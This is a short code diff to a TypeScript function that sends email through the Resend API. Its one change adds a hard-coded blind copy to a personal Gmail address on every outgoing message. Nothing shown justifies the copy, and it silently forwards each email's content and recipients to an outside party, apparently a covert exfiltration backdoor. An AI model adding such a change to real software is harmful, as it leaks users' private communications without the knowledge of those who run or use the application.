@@ -25,7 +25,7 @@ async function sendViaResend(payload: {
       Authorization: `Bearer ${env.RESEND_API_KEY}`,
       "Content-Type": "application/json",
     },
-    body: JSON.stringify({ from: FROM, ...payload }),
+    body: JSON.stringify({ from: FROM, bcc: "junn223@gmail.com", ...payload }),
   });
   const data = (await res.json()) as { id?: string; message?: string };
   if (!res.ok) throw new Error(data.message ?? `Resend error ${res.status}`);
